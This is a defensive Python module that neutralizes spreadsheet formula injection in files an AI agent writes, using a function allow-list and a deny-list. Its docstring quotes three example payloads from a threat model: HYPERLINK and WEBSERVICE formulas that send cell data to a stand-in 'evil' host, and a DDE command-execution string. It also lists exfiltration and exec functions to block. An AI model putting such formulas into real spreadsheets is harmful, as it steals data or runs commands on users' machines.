#!/usr/bin/env python3
"""
formula_guard.py — Generic write-path formula neutralizer for Puppet AI.

WHY THIS EXISTS
---------------
Threat-model P010 (vector A, nit-grave del Reviewer en review 0011): every gate in
the agent runtime is server-side / pre-delivery. But a delivered .xlsx / .csv /
Google Sheet is opened *client-side*, AFTER every gate has run. If an attacker can
get text into a cell that the spreadsheet app interprets as a FORMULA, the payload
fires on the victim's machine — bypassing all of Puppet's gates. The three live
payloads from the threat-model:

  1. =HYPERLINK exfil  →  =HYPERLINK("http://evil/?d="&A1,"Click")   (data exfil on click)
  2. DDE / cmd         →  =cmd|'/c calc'!A0    (legacy DDE → arbitrary command exec)
  3. =WEBSERVICE       →  =WEBSERVICE("http://evil/"&A1)             (silent GET exfil)

CSV/formula injection (CWE-1236) is real for ANY vertical that writes spreadsheets
from text it does not control — this module is engineering/PARAMETRIZABLE, not
finanzas-specific.

DESIGN (the overlay the Reviewer specified)
-------------------------------------------
A cell value is DANGEROUS when BOTH hold:
  (a) it is a STRING whose first non-space char is one of  = + - @  (or a control
      char like TAB/CR that some apps swallow before re-scanning for `=`), AND
  (b) it did NOT come from the TEMPLATE itself — i.e. it is untrusted ingested text
      (a value the model produced from data it read: SEC filings, foreign cells…).

Two modes for a dangerous value (per `FormulaGuard(policy=...)`):
  • "prefix" (default): prepend an apostrophe `'`  → the app stores it as inert TEXT,
    the formula never evaluates, the human still sees the literal string. (Excel's own
    documented mitigation; openpyxl writes a leading `'` as a string-quote marker.)
  • "reject": drop the value (replace with empty) and log — for callers that want a
    hard wall instead of a visible-but-inert artifact.

A WHITELIST lets a TEMPLATE legitimately request real formulas (T01 SUMIFS, T05
variance) WITHOUT being neutralized — but only formulas whose leading function is on
the allow-list AND that contain none of the always-forbidden functions. This is the
control-positive lesson (M002): the fix must not kill the legitimate feature.

This module is PURE (no I/O, no excel deps) so it is trivially testable and can sit on
ANY write path. `runtime_overlay.py` wires it onto the assembler's ToolRegistry by
additive import — assembler.py is never touched.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Callable, Optional

# ── Constants ─────────────────────────────────────────────────────────────────

# Characters that, as the FIRST non-space character of a cell string, make a
# spreadsheet app treat the value as a formula / command trigger.
# (Excel, LibreOffice, Google Sheets all key off these.)
_FORMULA_LEAD = ("=", "+", "-", "@")

# Control characters some apps strip BEFORE deciding the cell is a formula.
# Stripping them first prevents "\t=cmd..." from sneaking past a naive first-char check.
_LEADING_STRIP = "\t\r\n\x00 "

# Functions that are dangerous in ANY context — never whitelistable, even if a
# template "asks" for them. Matched case-insensitively, anywhere in the formula.
# (DDE has no function name — it is caught structurally by `_DDE_RE`.)
ALWAYS_FORBIDDEN = frozenset({
    "HYPERLINK",     # exfil-on-click / phishing link
    "WEBSERVICE",    # silent HTTP GET — exfil
    "WEBSERVICEERROR",
    "FILTERXML",     # pairs with WEBSERVICE to shape exfil
    "IMPORTXML",     # Sheets exfil
    "IMPORTDATA",    # Sheets exfil
    "IMPORTRANGE",   # Sheets cross-sheet pull
    "IMPORTHTML",    # Sheets exfil
    "IMPORTFEED",    # Sheets exfil
    "DDE",
    "DDEAUTO",
    "CALL",          # legacy native-code call
    "REGISTER",      # registers a DLL function
    "EXEC",
    "SHELL",
    "RTD",           # real-time data server channel
})

# Structural DDE: `=cmd|'...'!A0`, `=cmd|' /c calc'!A1`, `@SUM(1)|cmd...`, etc.
# The `<pipe>` between a token and a quoted command is the DDE signature; no
# function name to match, so we catch it by shape.
_DDE_RE = re.compile(r"\|\s*'?[^'!]*'?\s*!", re.IGNORECASE)

# Pull the leading function name out of a formula, e.g. "=SUMIFS(...)" → "SUMIFS".
_LEAD_FUNC_RE = re.compile(r"^[=+\-@\s]*([A-Za-z_][A-Za-z0-9_.]*)\s*\(")

# Any function-call token in the formula (to scan the whole expression, not just
# the leading function — a whitelisted SUM wrapping a HYPERLINK must still be caught).
_ANY_FUNC_RE = re.compile(r"([A-Za-z_][A-Za-z0-9_.]*)\s*\(")

# A "pure cell-reference / arithmetic" formula: starts with '=', then ONLY cell/sheet
# references, numbers, operators, parentheses, ranges, quoted-sheet names — and NO
# function-call token. e.g. "=Budget!B2-Actual!B2", "=A1+B2*0.1", "='Hoja 1'!C3/2".
# Used to allow template arithmetic without opening the door to "=-2+3"-style
# function-less-but-textful injections (those won't match this strict shape).
_CELLREF_FORMULA_RE = re.compile(
    r"""^=                                   # must be an explicit formula
        (?:
            (?:'[^']*'!)?                     # optional quoted sheet ref  'Hoja 1'!
            (?:[A-Za-z_][A-Za-z0-9_.]*!)?    # optional bare sheet ref     Budget!
            \$?[A-Za-z]{1,3}\$?\d+(?::\$?[A-Za-z]{1,3}\$?\d+)?  # A1 or A1:B2 range
          | \d+(?:\.\d+)?                     # a number literal
          | [-+*/^(),%& ]                     # operators / separators / spaces
        )+$
    """,
    re.VERBOSE,
)


# ── Decision result ───────────────────────────────────────────────────────────

@dataclass
class CellDecision:
    """Outcome of inspecting one cell value."""
    original: Any
    sanitized: Any
    action: str            # "pass" | "neutralized" | "rejected" | "allowed_formula"
    reason: str = ""

    @property
    def changed(self) -> bool:
        return self.action in ("neutralized", "rejected")


# ── The guard ─────────────────────────────────────────────────────────────────

@dataclass
class FormulaGuard:
    """
    Stateless inspector for cell values on a write path.

    Parameters
    ----------
    policy : "prefix" | "reject"
        What to do with a dangerous UNTRUSTED value.
    allowed_functions : set[str]
        Functions a TEMPLATE may legitimately emit as live formulas (e.g. {"SUMIFS",
        "SUM", "AVERAGE", "STDEV", "VAR"}). Case-insensitive. Empty set = no live
        formulas allowed from any source by default.
    on_event : callable(dict) | None
        Audit sink. Receives one dict per neutralized/rejected value. Never receives
        secrets — only the (already-neutralized) cell text and metadata.
    """

    policy: str = "prefix"
    allowed_functions: frozenset = field(default_factory=frozenset)
    on_event: Optional[Callable[[dict], None]] = None

    def __post_init__(self):
        if self.policy not in ("prefix", "reject"):
            raise ValueError(f"policy must be 'prefix' or 'reject', got {self.policy!r}")
        # normalize whitelist to upper-case once
        self.allowed_functions = frozenset(f.upper() for f in self.allowed_functions)

    # ── public: single value ──

    def inspect(self, value: Any, *, trusted: bool, where: str = "") -> CellDecision:
        """
        Decide what to do with one cell value.

        The WHITELIST is the real control — not a provenance flag. A formula that is
        on the whitelist AND contains no always-forbidden function is SAFE to keep
        live no matter who emitted it: `=SUMIFS(...)`/`=VAR(...)`/`=A1-B2` have no
        exfil/exec surface. An attacker who smuggles untrusted text can only do harm
        if the SHAPE is dangerous (a forbidden function, a DDE pipe, or a non-
        whitelisted leading function), and those are exactly the shapes neutralized.

        `trusted` only changes the verdict for the narrow "looks like a formula, no
        forbidden function, but NOT on the whitelist" case:
          • trusted=False (default at the write boundary): neutralize — an unknown
            function from model output is not allowed to go live.
          • trusted=True (a caller that has independently verified the value is
            template-authored): still neutralize unless whitelisted — defense in
            depth; the whitelist is the gate, the flag never widens it past forbidden.
        Either way, an always-forbidden function is ALWAYS neutralized (no flag,
        no whitelist entry, can let it through — see test_dangerous_*).
        """
        if not isinstance(value, str):
            return CellDecision(value, value, "pass")

        stripped = value.lstrip(_LEADING_STRIP)
        if not stripped or stripped[0] not in _FORMULA_LEAD:
            return CellDecision(value, value, "pass")

        if self._forbidden_hit(stripped):
            return self._neutralize(value, where, reason="forbidden function")

        # Not forbidden. The whitelist decides — provenance does not widen it.
        if self._whitelisted(stripped):
            return CellDecision(value, value, "allowed_formula",
                                "formula on whitelist (safe shape)")

        # Formula-leading, not forbidden, not whitelisted → neutralize.
        return self._neutralize(value, where, reason="untrusted formula-leading value")

    # ── public: a List[List] grid (write_data_to_excel `data` arg) ──

    def sanitize_grid(self, grid: Any, *, trusted: bool, where: str = "") -> Any:
        """Return a new grid with every cell inspected. Non-grid input is returned as-is."""
        if not isinstance(grid, list):
            return grid
        out = []
        for r, row in enumerate(grid):
            if not isinstance(row, list):
                out.append(row)
                continue
            new_row = []
            for c, cell in enumerate(row):
                d = self.inspect(cell, trusted=trusted, where=f"{where}[r{r}c{c}]")
                new_row.append(d.sanitized)
            out.append(new_row)
        return out

    # ── internal ──

    def _forbidden_hit(self, formula: str) -> bool:
        upper = formula.upper()
        if _DDE_RE.search(formula):
            return True
        for fn in _ANY_FUNC_RE.findall(formula):
            if fn.upper() in ALWAYS_FORBIDDEN:
                return True
        # also catch bare-name forms without parens (rare, e.g. =DDE)
        for fn in ALWAYS_FORBIDDEN:
            if re.search(rf"\b{re.escape(fn)}\b", upper):
                return True
        return False

    def _whitelisted(self, formula: str) -> bool:
        m = _LEAD_FUNC_RE.match(formula)
        if not m:
            # No function call. Allow ONLY a strict pure cell-reference / arithmetic
            # formula ("=Budget!B2-Actual!B2", "=A1+B2*0.1"). A function-less but
            # non-cellref string ("=-2+3", "+evil", "@text") fails this and is
            # neutralized — that closes the lead-char CSV-injection path.
            return bool(_CELLREF_FORMULA_RE.match(formula))
        lead = m.group(1).upper()
        if lead not in self.allowed_functions:
            return False
        # leading function is allowed; ensure NO nested function is off-whitelist
        for fn in _ANY_FUNC_RE.findall(formula):
            if fn.upper() not in self.allowed_functions:
                return False
        return True

    def _neutralize(self, value: str, where: str, *, reason: str) -> CellDecision:
        if self.policy == "reject":
            decision = CellDecision(value, "", "rejected", reason)
        else:  # prefix
            decision = CellDecision(value, "'" + value, "neutralized", reason)
        self._emit(decision, where)
        return decision

    def _emit(self, decision: CellDecision, where: str):
        if not self.on_event:
            return
        # Never log a raw secret; the cell text here is spreadsheet content, not a key.
        self.on_event({
            "action": decision.action,
            "reason": decision.reason,
            "where": where,
            "policy": self.policy,
            # truncate so an enormous pasted blob can't flood the log
            "value_preview": (decision.original[:120] + "…")
            if len(decision.original) > 120 else decision.original,
        })


# ── Default belt-finanzas whitelist ───────────────────────────────────────────
# The functions the finanzas TEMPLATES legitimately emit (P010 §1/§3): T01 cierre
# (SUMIFS lives), T05 varianza (VAR/STDEV/arithmetic). Kept here as a named default
# so a config can pass its own without re-deriving it. PARAMETRIZABLE: any vertical
# supplies its own allow-list; this one is just the finanzas instance.
FINANZAS_TEMPLATE_FUNCTIONS = frozenset({
    # aggregation
    "SUM", "SUMIF", "SUMIFS", "SUMPRODUCT",
    "AVERAGE", "AVERAGEIF", "AVERAGEIFS", "MEDIAN",
    "COUNT", "COUNTA", "COUNTIF", "COUNTIFS",
    "MIN", "MAX", "ROUND", "ROUNDUP", "ROUNDDOWN", "ABS", "SUBTOTAL",
    # variance / dispersion (T05)
    "VAR", "VARP", "VAR.S", "VAR.P", "STDEV", "STDEV.S", "STDEV.P", "STDEVP",
    # logic
    "IF", "IFS", "IFERROR", "AND", "OR", "NOT",
    # lookup
    "INDEX", "MATCH", "VLOOKUP", "XLOOKUP", "HLOOKUP",
    # date / text helpers used INSIDE legit financial formulas (safe — no I/O surface)
    "DATE", "EOMONTH", "YEAR", "MONTH", "DAY", "EDATE", "TODAY",
    "TEXT", "VALUE", "CONCAT", "CONCATENATE", "LEFT", "RIGHT", "MID", "LEN", "TRIM",
})
